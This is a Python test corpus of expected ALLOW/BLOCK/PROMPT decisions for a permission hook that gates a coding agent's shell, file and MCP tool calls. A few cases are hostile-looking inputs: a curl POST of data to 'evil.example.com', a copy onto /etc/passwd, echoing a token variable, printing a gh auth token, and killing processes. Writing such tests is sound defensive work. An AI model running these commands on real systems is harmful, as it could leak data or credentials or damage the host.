"""Behavior specification corpus.

Each case is the hook's input plus the decision it is expected to produce:
  id      - stable identifier
  tool    - tool_name (Bash, Write, Edit, PowerShell, or an mcp__ name)
  command / file_path - tool input; placeholders {CWD} and {HOME} are resolved
            against per-run fixture dirs
  cwd     - "git" (dir with .git) or "plain"; default "git"
  files   - optional {relpath: content} created under the working dir first
  expect  - "ALLOW" (auto-approve), "BLOCK" (deny + rewrite message), or
            "PROMPT" (defer to a manual prompt)

These expectations ARE the spec — hand-verified, asserted directly by
test_characterization.py. Tests run with AI disabled, the trusted set pinned to
fixtures/trusted_commands.json, and config from fixtures/config.json
(curl_domains=["example.org"], mcp_blanket_servers=["myserver"]).
"""

CASES = [
    # --- trusted bash -------------------------------------------------------
    {"id": "trusted_single_ls", "tool": "Bash", "command": "ls -la", "expect": "ALLOW"},
    {"id": "trusted_grep_devnull", "tool": "Bash", "command": "grep -r foo . 2>/dev/null", "expect": "ALLOW"},
    {"id": "trusted_compound", "tool": "Bash", "command": "cd plugins && grep -r x . 2>/dev/null", "expect": "BLOCK"},

    # --- git allowlist (deny-by-default) ------------------------------------
    {"id": "git_status", "tool": "Bash", "command": "git status", "expect": "ALLOW"},
    {"id": "git_log", "tool": "Bash", "command": "git log --oneline -5", "expect": "ALLOW"},
    {"id": "git_commit", "tool": "Bash", "command": "git commit -m hello", "expect": "ALLOW"},
    {"id": "git_push_plain", "tool": "Bash", "command": "git push", "expect": "ALLOW"},
    {"id": "git_reset_soft", "tool": "Bash", "command": "git reset --soft HEAD~1", "expect": "ALLOW"},
    {"id": "git_checkout_branch", "tool": "Bash", "command": "git checkout -b feature", "expect": "ALLOW"},
    {"id": "git_push_force", "tool": "Bash", "command": "git push --force", "expect": "PROMPT"},
    {"id": "git_reset_hard_origin", "tool": "Bash", "command": "git reset --hard origin/main", "expect": "ALLOW"},
    {"id": "git_reset_hard_head", "tool": "Bash", "command": "git reset --hard HEAD", "expect": "PROMPT"},
    {"id": "git_reset_hard_pathspec", "tool": "Bash", "command": "git reset --hard -- origin/main", "expect": "PROMPT"},
    {"id": "git_checkout_dot", "tool": "Bash", "command": "git checkout .", "expect": "ALLOW"},
    {"id": "git_branch_delete", "tool": "Bash", "command": "git branch -D old", "expect": "ALLOW"},
    {"id": "git_rebase_not_listed", "tool": "Bash", "command": "git rebase main", "expect": "ALLOW"},
    {"id": "git_clean_force", "tool": "Bash", "command": "git clean -fd", "expect": "PROMPT"},
    {"id": "git_clean_dry", "tool": "Bash", "command": "git clean -n", "expect": "ALLOW"},

    # --- gh -----------------------------------------------------------------
    {"id": "gh_pr_list", "tool": "Bash", "command": "gh pr list", "expect": "ALLOW"},
    {"id": "gh_issue_view", "tool": "Bash", "command": "gh issue view 5", "expect": "ALLOW"},
    {"id": "gh_pr_merge_pair", "tool": "Bash", "command": "gh pr merge 5", "expect": "ALLOW"},
    {"id": "gh_api_get", "tool": "Bash", "command": "gh api repos/foo/bar", "expect": "ALLOW"},
    {"id": "gh_api_post_reversible", "tool": "Bash", "command": "gh api -X POST repos/o/r/issues -f title=x", "expect": "ALLOW"},
    {"id": "gh_api_delete_irreversible", "tool": "Bash", "command": "gh api -X DELETE repos/o/r", "expect": "PROMPT"},
    {"id": "gh_api_patch_repo_settings", "tool": "Bash", "command": "gh api -X PATCH repos/o/r -f delete_branch_on_merge=true", "expect": "ALLOW"},
    {"id": "gh_unknown_group", "tool": "Bash", "command": "gh secret list", "expect": "PROMPT"},
    {"id": "gh_auth_status", "tool": "Bash", "command": "gh auth status", "expect": "ALLOW"},
    {"id": "gh_auth_switch", "tool": "Bash", "command": "gh auth switch --user rrrutledge", "expect": "ALLOW"},
    {"id": "gh_auth_token", "tool": "Bash", "command": "gh auth token", "expect": "ALLOW"},
    {"id": "gh_repo_flag_pr_create", "tool": "Bash", "command": "gh --repo owner/repo pr create --title x --body y", "expect": "ALLOW"},
    {"id": "gh_R_flag_pr_list", "tool": "Bash", "command": "gh -R owner/repo pr list", "expect": "ALLOW"},
    {"id": "gh_repo_flag_issue_view", "tool": "Bash", "command": "gh --repo owner/repo issue view 5", "expect": "ALLOW"},
    {"id": "gh_repo_sync", "tool": "Bash", "command": "gh repo sync owner/repo --source owner/repo --branch main", "expect": "ALLOW"},
    {"id": "gh_repo_sync_force", "tool": "Bash", "command": "gh repo sync owner/repo --branch main --force", "expect": "PROMPT"},
    # Editing a file's bytes through the Contents API is always the wrong
    # mechanism per CLAUDE.md ("clone, don't API") -- blocked outright with a
    # rewrite hint rather than left to the reversibility-based approve layer.
    {"id": "gh_api_contents_put_blocked", "tool": "Bash",
     "command": 'gh api repos/o/r/contents/path/file.md -X PUT --input payload.json', "expect": "BLOCK"},
    {"id": "gh_api_contents_delete_blocked", "tool": "Bash",
     "command": "gh api -X DELETE repos/o/r/contents/path/file.md -f message=x -f sha=abc", "expect": "BLOCK"},
    # Reading a file's content via the same endpoint is fine -- only the
    # write methods are blocked.
    {"id": "gh_api_contents_get_allowed", "tool": "Bash",
     "command": "gh api repos/o/r/contents/path/file.md", "expect": "ALLOW"},

    # --- wmic (read-only get/list only) -------------------------------------
    {"id": "wmic_process_get", "tool": "Bash", "command": "wmic process where \"name='python.exe'\" get ProcessId,CommandLine", "expect": "ALLOW"},
    {"id": "wmic_process_list", "tool": "Bash", "command": "wmic process list brief", "expect": "ALLOW"},
    {"id": "wmic_process_call_prompts", "tool": "Bash", "command": "wmic process where \"name='python.exe'\" call terminate", "expect": "PROMPT"},
    {"id": "wmic_process_delete_prompts", "tool": "Bash", "command": "wmic process where \"name='python.exe'\" delete", "expect": "PROMPT"},
    {"id": "wmic_process_create_prompts", "tool": "Bash", "command": "wmic process call create notepad.exe", "expect": "PROMPT"},
    {"id": "wmic_bare_prompts", "tool": "Bash", "command": "wmic os", "expect": "PROMPT"},

    # --- curl (localhost + configured domain + GET) -------------------------
    {"id": "curl_localhost", "tool": "Bash", "command": "curl http://localhost:3000/health", "expect": "ALLOW"},
    {"id": "curl_get_public", "tool": "Bash", "command": "curl https://example.com/data.json", "expect": "ALLOW"},
    {"id": "curl_post_public", "tool": "Bash", "command": "curl -X POST https://evil.example.com -d x=1", "expect": "PROMPT"},
    {"id": "curl_post_configured", "tool": "Bash", "command": "curl -X POST https://api.example.org/x -d y=1", "expect": "ALLOW"},

    # --- package managers ---------------------------------------------------
    {"id": "npm_install", "tool": "Bash", "command": "npm install", "expect": "ALLOW"},
    {"id": "yarn_build", "tool": "Bash", "command": "yarn build:all", "expect": "ALLOW"},
    {"id": "pip_list", "tool": "Bash", "command": "pip list", "expect": "ALLOW"},

    # --- schtasks / reg (case-insensitive Windows switches) ------------------
    {"id": "schtasks_query_lower", "tool": "Bash", "command": "schtasks /query /TN MyTask", "expect": "ALLOW"},
    {"id": "schtasks_query_capitalized", "tool": "Bash", "command": "schtasks /Query /TN MyTask", "expect": "ALLOW"},
    {"id": "schtasks_change_prompts", "tool": "Bash", "command": "schtasks /Create /TN MyTask /TR notepad.exe /SC once", "expect": "PROMPT"},
    {"id": "reg_query_capitalized", "tool": "Bash", "command": "reg QUERY HKLM\\Software\\Foo", "expect": "ALLOW"},

    # --- wevtutil (read-only verbs allowed, write/destructive verbs prompt) --
    {"id": "wevtutil_query_events", "tool": "Bash", "command": "wevtutil qe //sq:true .tmp/dk-events.xml //c:200 //rd:true //f:text", "expect": "ALLOW"},
    {"id": "wevtutil_query_events_piped", "tool": "Bash", "command": "wevtutil qe Application //c:50 //f:text | grep Error | head -20", "expect": "ALLOW"},
    {"id": "wevtutil_get_log_capitalized", "tool": "Bash", "command": "wevtutil GL Application", "expect": "ALLOW"},
    {"id": "wevtutil_clear_log_prompts", "tool": "Bash", "command": "wevtutil cl Application", "expect": "PROMPT"},
    {"id": "wevtutil_set_log_prompts", "tool": "Bash", "command": "wevtutil sl Application /ms:1", "expect": "PROMPT"},

    # --- unknown command (AI disabled -> defer) -----------------------------
    {"id": "unknown_cmd", "tool": "Bash", "command": "frobnicate --all", "expect": "PROMPT"},

    # --- sed ----------------------------------------------------------------
    {"id": "sed_inplace", "tool": "Bash", "command": "sed -i s/a/b/ file.txt", "expect": "BLOCK"},
    {"id": "sed_plain", "tool": "Bash", "command": "sed s/a/b/ file.txt", "expect": "ALLOW"},

    # --- taskkill (self-close-my-own-tab only; anything else prompts) -------
    # A real self-target ALLOW depends on the live process tree at test time
    # (not a static literal), so it's covered by test_units.py's
    # TestTaskkill/TestSelfTabHostPid instead — these cases pin the negative
    # (never blanket-approved) forms.
    {"id": "taskkill_bogus_pid", "tool": "Bash", "command": "taskkill /PID 999999 /T /F", "expect": "PROMPT"},
    {"id": "taskkill_image_name", "tool": "Bash", "command": "taskkill /IM chrome.exe /F", "expect": "PROMPT"},
    {"id": "taskkill_remote_host", "tool": "Bash", "command": "taskkill /S otherhost /PID 1 /F", "expect": "PROMPT"},
    # MSYS/Git-Bash doubles the leading slash (//PID, //T, //F) to escape its
    # path-mangling — same negative case, doubled-slash form.
    {"id": "taskkill_bogus_pid_msys", "tool": "Bash", "command": "taskkill //PID 999999 //T //F", "expect": "PROMPT"},
    # The drainer's self-close primitive (fires SessionEnd, then kills its own
    # tab) must auto-approve via the trusted plugin-cache script dir — a worker
    # that hits a prompt here sits open forever instead of closing silently.
    {"id": "close_session_plugin_script", "tool": "Bash",
     "command": "python \"C:/Users/x/.claude/plugins/cache/rrrutledge-claude-code-plugins/drainer/1.39.0/skills/drainer/scripts/close-session.py\"",
     "expect": "ALLOW"},
    # cp/mv/ln/touch/chmod against the installed plugin cache always re-hits
    # Claude Code's own sensitive-file confirmation regardless of this hook's
    # decision, so it's blocked with a rewrite instead -- unlike running a
    # plugin's own script straight from the cache (the case just above).
    {"id": "cp_from_plugin_cache",
     "command": 'cp "{HOME}/.claude/plugins/cache/repo/browser-chauffeur/1.10.3/templates/x.js" ".tmp/x.js"',
     "tool": "Bash", "expect": "BLOCK"},
    # Same rule for a plain read (ls, cat, grep, ...) against the cache --
    # not just file ops. The checked-out repo source has identical content
    # and isn't gated, so the hook redirects there instead of letting the
    # command reach the unavoidable native prompt.
    {"id": "ls_from_plugin_cache",
     "command": 'ls "{HOME}/.claude/plugins/cache/repo/drainer/1.45.2/skills/drainer/providers"',
     "tool": "Bash", "expect": "BLOCK"},
    # A find from /, a drive root, or home with no -maxdepth is blocked (see
    # detect_unbounded_wide_find for why). Bounded finds still go through.
    {"id": "find_root_wide", "tool": "Bash",
     "command": 'find / -iname "mail.js" -path "*ms-graph*" 2>/dev/null | head -5', "expect": "BLOCK"},
    {"id": "find_home_wide", "tool": "Bash", "command": 'find ~ -name trello_utils.py', "expect": "BLOCK"},
    {"id": "find_root_maxdepth", "tool": "Bash", "command": 'find / -maxdepth 1 -name "*.log"', "expect": "ALLOW"},
    {"id": "find_repo_dir", "tool": "Bash", "command": 'find plugins -name "*.py"', "expect": "ALLOW"},

    # --- enforcement (can't statically validate -> rewrite) -----------------
    {"id": "heredoc", "tool": "Bash", "command": "cat << EOF\nhi\nEOF", "expect": "BLOCK"},
    # PowerShell here-string syntax (@'...'@) is not valid Bash: an embedded
    # apostrophe (a contraction, e.g. "letter's") silently closes the quote
    # early and corrupts the argument, so it's blocked rather than validated.
    {"id": "powershell_herestring", "tool": "Bash",
     "command": "git commit -m @'\nthe cover letter's default structure\n'@", "expect": "BLOCK"},
    # A single-quoted string that merely contains a literal "@" on its own
    # line (not the here-string open/close pair) must not be misdetected.
    {"id": "at_sign_not_herestring", "tool": "Bash",
     "command": "echo 'contact: foo@bar.com'", "expect": "ALLOW"},
    {"id": "output_redirect", "tool": "Bash", "command": "echo hi > out.txt", "expect": "BLOCK"},
    {"id": "append_redirect", "tool": "Bash", "command": "echo hi >> out.txt", "expect": "BLOCK"},
    # Regression: a quoted redirect target used to be stripped to nothing
    # before the target-detection regex ran, so it never matched and the
    # command fell through to a plain permission prompt instead of BLOCK.
    {"id": "quoted_output_redirect", "tool": "Bash",
     "command": 'echo hi > "C:\\Users\\some dir\\out.txt"', "expect": "BLOCK"},
    {"id": "input_redirect", "tool": "Bash", "command": "sort < in.txt", "expect": "BLOCK"},
    {"id": "var_expansion", "tool": "Bash", "command": "echo $MYTOKEN", "expect": "BLOCK"},
    {"id": "var_assignment", "tool": "Bash", "command": "X=1 && echo done", "expect": "BLOCK"},
    {"id": "cmd_c", "tool": "Bash", "command": "cmd /c dir", "expect": "BLOCK"},
    {"id": "complex_for", "tool": "Bash", "command": "for f in *; do echo $f; done", "expect": "BLOCK"},
    {"id": "complex_while", "tool": "Bash", "command": "while true; do echo x; done", "expect": "BLOCK"},
    {"id": "complex_if", "tool": "Bash", "command": "if [ -f x ]; then echo y; fi", "expect": "BLOCK"},
    {"id": "complex_subst", "tool": "Bash", "command": "echo $(date)", "expect": "BLOCK"},
    {"id": "complex_backtick", "tool": "Bash", "command": "echo `date`", "expect": "BLOCK"},
    {"id": "brace_group", "tool": "Bash", "command": "{ echo a; echo b; }", "expect": "BLOCK"},
    {"id": "inline_python", "tool": "Bash", "command": "python -c \"print(1)\"", "expect": "BLOCK"},
    {"id": "inline_node", "tool": "Bash", "command": "node -e \"console.log(1)\"", "expect": "BLOCK"},
    {"id": "powershell_cmdlet", "tool": "Bash", "command": "Get-ChildItem", "expect": "BLOCK"},
    {"id": "redundant_cd_cwd", "tool": "Bash", "command": "cd {CWD} && ls", "expect": "BLOCK"},
    {"id": "redundant_cd_cwd_semi", "tool": "Bash", "command": "cd {CWD}; ls", "expect": "BLOCK"},
    {"id": "cd_compound_semi", "tool": "Bash", "command": "cd ~/Dev/some-other-dir; node mail.js --list-unread", "expect": "BLOCK"},

    # --- start / wt ---------------------------------------------------------
    {"id": "start_docx", "tool": "Bash", "command": "start report.docx", "expect": "ALLOW"},
    {"id": "start_exe", "tool": "Bash", "command": "start evil.exe", "expect": "PROMPT"},
    {"id": "wt_claude", "tool": "Bash", "command": "wt new-tab claude --version", "expect": "ALLOW"},
    # A full path to wt.exe (not the bare `wt` on PATH) launching the known
    # handoff-session script must still be recognized: first_word() collapses
    # any "*wt.exe" path down to bare "wt" before dispatch, so the exe-path
    # check has to live inside is_wt_safe rather than a separate word.endswith
    # branch (which is unreachable once .exe is stripped).
    {"id": "wt_exe_fullpath_launch_session", "tool": "Bash",
     "command": ('"{HOME}/AppData/Local/Microsoft/WindowsApps/wt.exe" -w 0 new-tab -d "{CWD}" '
                 '--title "x" powershell -NoExit -NoProfile -File '
                 '"{HOME}/Dev/rrrutledge/rrrutledge-claude-code-plugins/scripts/launch-session.ps1" '
                 '-Model "claude-sonnet-4-6" -SeedFile "{CWD}/.tmp/handoff-seed.txt"'),
     "expect": "ALLOW"},
    # Same full-path wt.exe shape but not launching the known script — must
    # still fall through to the untrusted-program prompt.
    {"id": "wt_exe_fullpath_untrusted", "tool": "Bash",
     "command": '"{HOME}/AppData/Local/Microsoft/WindowsApps/wt.exe" -w 0 new-tab powershell -NoExit -Command x',
     "expect": "PROMPT"},
    # A trailing stream-merge redirect (added to silence terminal noise) must
    # not defeat is_start_safe's target-extension check.
    {"id": "start_docx_stderr_merge", "tool": "Bash", "command": "start report.docx 2>&1", "expect": "ALLOW"},
    {"id": "start_docx_stderr_pipe_head", "tool": "Bash",
     "command": 'start report.docx 2>&1 | head -2', "expect": "ALLOW"},
    {"id": "start_exe_stderr_merge", "tool": "Bash", "command": "start evil.exe 2>&1", "expect": "PROMPT"},

    # --- CWD-scoped file ops ------------------------------------------------
    {"id": "cp_within", "tool": "Bash", "command": "cp a.txt b.txt", "files": {"a.txt": "x"}, "expect": "ALLOW"},
    {"id": "cp_outside", "tool": "Bash", "command": "cp a.txt /etc/passwd", "files": {"a.txt": "x"}, "expect": "PROMPT"},
    {"id": "cp_within_stderr_merge", "tool": "Bash", "command": "cp a.txt b.txt 2>&1",
     "files": {"a.txt": "x"}, "expect": "ALLOW"},
    # .tmp/ is scratch space in every repo, not just the current one -- a
    # destination under a `.tmp` dir in an unrelated directory is still safe.
    {"id": "cp_to_unrelated_repo_tmp_dir", "tool": "Bash",
     "command": 'cp a.txt "{HOME}/Dev/some-other-repo/.tmp/b.txt"', "files": {"a.txt": "x"}, "expect": "ALLOW"},

    # --- scripts (deny-by-default; trusted dir vs elsewhere) ----------------
    {"id": "pyfile_tmp", "tool": "Bash", "command": "python .tmp/run.py",
     "files": {".tmp/run.py": "print(1)\n"}, "expect": "ALLOW"},
    {"id": "pyfile_tmp_subprocess", "tool": "Bash", "command": "python .tmp/bad.py",
     "files": {".tmp/bad.py": "import subprocess\nsubprocess.run(['ls'])\n"}, "expect": "BLOCK"},
    {"id": "pyfile_outside", "tool": "Bash", "command": "python src/run.py",
     "files": {"src/run.py": "print(1)\n"}, "expect": "PROMPT"},

    # --- direct script execution (.py/.js as the command) -------------------
    {"id": "direct_py_tmp", "tool": "Bash", "command": ".tmp/run.py",
     "files": {".tmp/run.py": "print(1)\n"}, "expect": "ALLOW"},
    {"id": "direct_py_outside", "tool": "Bash", "command": "src/run.py",
     "files": {"src/run.py": "print(1)\n"}, "expect": "PROMPT"},
    {"id": "direct_js_tmp", "tool": "Bash", "command": ".tmp/run.js",
     "files": {".tmp/run.js": "console.log(1)\n"}, "expect": "ALLOW"},
    {"id": "direct_js_outside", "tool": "Bash", "command": "src/run.js",
     "files": {"src/run.js": "console.log(1)\n"}, "expect": "PROMPT"},

    # --- MCP ----------------------------------------------------------------
    {"id": "mcp_read", "tool": "mcp__server__get_thing", "expect": "ALLOW"},
    {"id": "mcp_write_reversible", "tool": "mcp__server__create_thing", "expect": "ALLOW"},
    {"id": "mcp_destructive", "tool": "mcp__server__delete_thing", "expect": "PROMPT"},
    {"id": "mcp_blanket_configured", "tool": "mcp__myserver__whatever", "expect": "ALLOW"},
    {"id": "mcp_unknown_verb", "tool": "mcp__server__frobnicate_thing", "expect": "PROMPT"},

    # --- Workflow -------------------------------------------------------------
    {"id": "workflow_named_blanket", "tool": "Workflow", "name": "myworkflow", "expect": "ALLOW"},
    {"id": "workflow_named_not_blanket", "tool": "Workflow", "name": "otherworkflow", "expect": "PROMPT"},
    # An inline script's self-declared meta.name is never trusted, however it names itself.
    {"id": "workflow_inline_script_claiming_blanket_name", "tool": "Workflow",
     "script": "export const meta = {\n  name: 'myworkflow',\n  description: 'x',\n}\nlog('hi')",
     "expect": "PROMPT"},
    {"id": "workflow_no_name_or_script", "tool": "Workflow", "expect": "PROMPT"},

    # --- Read ---------------------------------------------------------------
    {"id": "read_claude_rules", "tool": "Read", "file_path": "{CWD}/.claude/rules/architecture.md", "expect": "ALLOW"},
    {"id": "read_claude_teams", "tool": "Read", "file_path": "{CWD}/.claude/teams/bugfix-squad/agent-04b.md", "expect": "ALLOW"},
    {"id": "read_claude_skills", "tool": "Read", "file_path": "{HOME}/.claude/skills/foo.md", "expect": "ALLOW"},
    {"id": "read_claude_commands", "tool": "Read", "file_path": "{CWD}/.claude/commands/research-phase.md", "expect": "ALLOW"},
    {"id": "read_claude_root_file", "tool": "Read", "file_path": "{CWD}/.claude/CLAUDE.md", "expect": "PROMPT"},
    {"id": "read_non_claude", "tool": "Read", "file_path": "{CWD}/src/index.ts", "expect": "PROMPT"},

    # --- Write / Edit -------------------------------------------------------
    {"id": "write_tmp", "tool": "Write", "file_path": "{CWD}/.tmp/note.txt", "expect": "ALLOW"},
    {"id": "write_temp_name", "tool": "Write", "file_path": "{CWD}/commit_tmp.txt", "expect": "ALLOW"},
    {"id": "write_in_gitrepo", "tool": "Write", "file_path": "{CWD}/src/file.py", "cwd": "git", "expect": "ALLOW"},
    {"id": "write_skill", "tool": "Write", "file_path": "{HOME}/.claude/skills/foo/SKILL.md", "expect": "ALLOW"},
    {"id": "edit_in_gitrepo", "tool": "Edit", "file_path": "{CWD}/src/file.py", "cwd": "git", "expect": "ALLOW"},
    # ~/.claude/drainer/ (including main-worktree/.tmp/...) is blocked even though it matches the
    # .tmp/-anywhere allow rule -- Claude Code's own sensitive-path prompt for ~/.claude/ can't be
    # suppressed by any hook decision, so this redirects the worker to its own repo's .tmp/ instead.
    {"id": "write_drainer_worktree_tmp", "tool": "Write",
     "file_path": "{HOME}/.claude/drainer/main-worktree/.tmp/summit-promo-scan.py", "expect": "BLOCK"},
    {"id": "write_drainer_runtime", "tool": "Write",
     "file_path": "{HOME}/.claude/drainer/runtime/seeds/item.prompt.txt", "expect": "BLOCK"},
    # Same reasoning, same fix, for the other path Claude Code always re-prompts on regardless of
    # this hook's decision: the installed plugin cache.
    {"id": "write_plugin_cache", "tool": "Write",
     "file_path": "{HOME}/.claude/plugins/cache/rrrutledge-claude-code-plugins/safe-compounds/1.10.0/hook.py",
     "expect": "BLOCK"},

    # --- PowerShell tool ----------------------------------------------------
    {"id": "powershell_tool", "tool": "PowerShell", "command": "Get-Process", "expect": "BLOCK"},
]
